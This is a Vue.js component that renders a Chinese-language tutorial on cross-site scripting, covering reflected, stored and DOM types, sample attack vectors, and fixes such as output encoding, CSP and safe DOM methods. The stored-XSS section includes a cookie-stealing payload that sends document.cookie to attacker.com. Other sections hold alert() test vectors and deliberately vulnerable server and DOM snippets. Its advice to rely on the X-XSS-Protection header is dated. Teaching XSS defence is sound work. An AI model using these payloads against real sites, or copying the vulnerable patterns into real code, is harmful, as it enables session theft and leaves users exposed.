<template>
  <div class="xss-guidance">
    <div class="mb-4">
      <h4 class="text-lg font-medium mb-2">XSS跨站脚本漏洞详解</h4>
      <p class="text-sm text-gray-700 mb-3">
        跨站脚本攻击(XSS)允许攻击者将恶意JavaScript代码注入到网页中，使其在用户浏览器中执行。这可能导致会话劫持、数据窃取、钓鱼攻击等多种安全威胁。
      </p>
    </div>
    
    <div class="mb-4">
      <h4 class="text-base font-medium mb-2">XSS的主要类型</h4>
      <el-tag type="danger" class="mr-2 mb-2">反射型XSS</el-tag>
      <el-tag type="warning" class="mr-2 mb-2">存储型XSS</el-tag>
      <el-tag type="info" class="mr-2 mb-2">DOM型XSS</el-tag>
      
      <el-collapse accordion class="mt-2">
        <el-collapse-item title="反射型XSS (Reflected XSS)">
          <p class="text-sm text-gray-700 mb-2">
            恶意代码包含在请求中（通常是URL参数），然后被服务器反射回页面中。当用户点击恶意链接时，代码在用户浏览器中执行。
          </p>
          <div class="bg-gray-50 p-3 rounded font-mono text-sm overflow-auto">
            <p>示例URL:</p>
            <code class="text-red-500">https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
          </div>
        </el-collapse-item>
        
        <el-collapse-item title="存储型XSS (Stored XSS)">
          <p class="text-sm text-gray-700 mb-2">
            恶意代码被永久存储在服务器上（如数据库中），当其他用户访问包含该数据的页面时，攻击代码会执行。
          </p>
          <div class="bg-gray-50 p-3 rounded font-mono text-sm overflow-auto">
            <p>示例（在评论系统中）:</p>
            <code class="text-red-500">&lt;script&gt;document.location='https://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code>
          </div>
        </el-collapse-item>
        
        <el-collapse-item title="DOM型XSS (DOM-based XSS)">
          <p class="text-sm text-gray-700 mb-2">
            漏洞存在于客户端JavaScript中，攻击代码不经过服务器，而是直接在浏览器中修改DOM结构。
          </p>
          <div class="bg-gray-50 p-3 rounded font-mono text-sm overflow-auto">
            <p>示例代码:</p>
            <pre class="text-red-500">
// 不安全的DOM操作
var pos = document.URL.indexOf("name=") + 5;
var name = document.URL.substring(pos, document.URL.length);
document.write("Hello, " + name + "!");
            </pre>
            <p>攻击URL:</p>
            <code class="text-red-500">https://example.com/page.html#name=&lt;img src=x onerror=alert('XSS')&gt;</code>
          </div>
        </el-collapse-item>
      </el-collapse>
    </div>
    
    <div class="mb-4">
      <h4 class="text-lg font-medium mb-2">攻击示例</h4>
      <el-collapse accordion>
        <el-collapse-item title="常见XSS攻击向量">
          <div class="bg-gray-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
            <p class="mb-1"># 基本JavaScript执行</p>
            <p class="mb-1"><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
            <p class="mb-1"># 事件处理器</p>
            <p class="mb-1"><code>&lt;img src="x" onerror="alert('XSS')"&gt;</code></p>
            <p class="mb-1"># JavaScript伪协议</p>
            <p class="mb-1"><code>&lt;a href="javascript:alert('XSS')"&gt;点击我&lt;/a&gt;</code></p>
            <p class="mb-1"># 基于CSS的攻击</p>
            <p class="mb-1"><code>&lt;div style="background:url('javascript:alert(\"XSS\")')"&gt;</code></p>
            <p class="mb-1"># HTML5特性</p>
            <p class="mb-1"><code>&lt;video&gt;&lt;source onerror="alert('XSS')"&gt;&lt;/video&gt;</code></p>
          </div>
        </el-collapse-item>
        
        <el-collapse-item title="漏洞代码示例">
          <div class="bg-gray-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
            <p class="text-red-500 mb-2">❌ 不安全的代码:</p>
            <pre>
// 服务器端 (Node.js) 示例
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    &lt;h1&gt;搜索结果: ${query}&lt;/h1&gt;
    &lt;div&gt;未找到匹配"${query}"的结果&lt;/div&gt;
  `);
});

// 客户端JavaScript示例
document.getElementById('message').innerHTML = 
  '欢迎, ' + getParameterByName('name');
            </pre>
          </div>
        </el-collapse-item>
      </el-collapse>
    </div>
    
    <div class="mb-4">
      <h4 class="text-lg font-medium mb-2">修复方案</h4>
      
      <div class="security-solution mb-3">
        <div class="solution-title text-md font-medium text-green-700 mb-1">1. 输出编码</div>
        <p class="text-sm text-gray-700 mb-2">
          根据输出上下文对数据进行适当的编码，是防御XSS的最重要手段。
        </p>
        <div class="bg-green-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
          <p class="text-green-600 mb-2">✅ 安全的代码:</p>
          <pre>
// HTML上下文编码 (Node.js)
const escapeHTML = str => 
  str.replace(/[&<>"']/g, tag => 
    ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[tag]));

app.get('/search', (req, res) => {
  const query = escapeHTML(req.query.q || '');
  res.send(`
    &lt;h1&gt;搜索结果: ${query}&lt;/h1&gt;
    &lt;div&gt;未找到匹配"${query}"的结果&lt;/div&gt;
  `);
});

// 现代框架自动转义
// Vue.js
&lt;div&gt;{{ userInput }}&lt;/div&gt;  // 自动HTML转义

// React
&lt;div&gt;{userInput}&lt;/div&gt;  // 自动HTML转义
          </pre>
        </div>
      </div>
      
      <div class="security-solution mb-3">
        <div class="solution-title text-md font-medium text-green-700 mb-1">2. 内容安全策略 (CSP)</div>
        <p class="text-sm text-gray-700 mb-2">
          CSP是一种浏览器安全机制，通过HTTP头或meta标签定义，可以限制页面可以加载和执行的资源，有效缓解XSS攻击。
        </p>
        <div class="bg-green-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
          <p class="text-green-600 mb-2">✅ 实现示例:</p>
          <pre>
// HTTP头实现 (Express.js)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' https://trusted-cdn.com; img-src 'self' data: https:; object-src 'none'"
  );
  next();
});

// HTML meta标签实现
&lt;meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted-cdn.com"&gt;
          </pre>
        </div>
      </div>
      
      <div class="security-solution mb-3">
        <div class="solution-title text-md font-medium text-green-700 mb-1">3. 安全的DOM操作</div>
        <p class="text-sm text-gray-700 mb-2">
          避免使用innerHTML等危险方法，使用更安全的DOM API。
        </p>
        <div class="bg-green-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
          <p class="text-green-600 mb-2">✅ 安全的DOM操作:</p>
          <pre>
// 不安全
element.innerHTML = userInput;  // 危险！

// 安全替代方案
element.textContent = userInput;  // 安全处理文本

// 创建安全的DOM元素
const div = document.createElement('div');
div.textContent = userInput;
parentElement.appendChild(div);
          </pre>
        </div>
      </div>
      
      <div class="security-solution mb-3">
        <div class="solution-title text-md font-medium text-green-700 mb-1">4. 输入验证</div>
        <p class="text-sm text-gray-700 mb-2">
          对用户输入进行验证和清理，只允许预期的数据格式和内容。
        </p>
        <div class="bg-green-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
          <p class="text-green-600 mb-2">✅ 验证示例:</p>
          <pre>
// 白名单验证
function isValidInput(input) {
  // 只允许字母、数字和常见标点符号
  return /^[A-Za-z0-9 .,!?-]+$/.test(input);
}

if (!isValidInput(userInput)) {
  return res.status(400).json({ error: "无效的输入" });
}
          </pre>
        </div>
      </div>
    </div>
    
    <div class="mb-4">
      <h4 class="text-lg font-medium mb-2">其他缓解措施</h4>
      <ul class="list-disc pl-5 text-sm text-gray-700 space-y-1">
        <li>使用 <code>X-XSS-Protection</code> 头启用浏览器内置XSS过滤器</li>
        <li>设置 <code>HttpOnly</code> 和 <code>Secure</code> Cookie标志防止脚本访问敏感Cookie</li>
        <li>实施子资源完整性(SRI)检查，确保加载的外部脚本未被篡改</li>
        <li>使用现代框架(Vue, React, Angular)提供的安全绑定机制</li>
        <li>使用HTTPS和HSTS防止中间人攻击</li>
        <li>定期进行安全审计和渗透测试</li>
      </ul>
    </div>
    
    <div class="p-3 bg-blue-50 rounded-md text-sm text-blue-800">
      <div class="font-medium mb-1">实时防御:</div>
      <p>
        除了防御措施外，建议在应用程序中实施XSS检测系统，监控异常请求模式和可疑输入，以及时发现和阻断XSS攻击尝试。考虑集成Web应用防火墙(WAF)来增强防御能力。
      </p>
    </div>
  </div>
</template>

<script setup>
// 无需额外逻辑
</script>

<style scoped>
.xss-guidance {
  width: 100%;
}
</style> 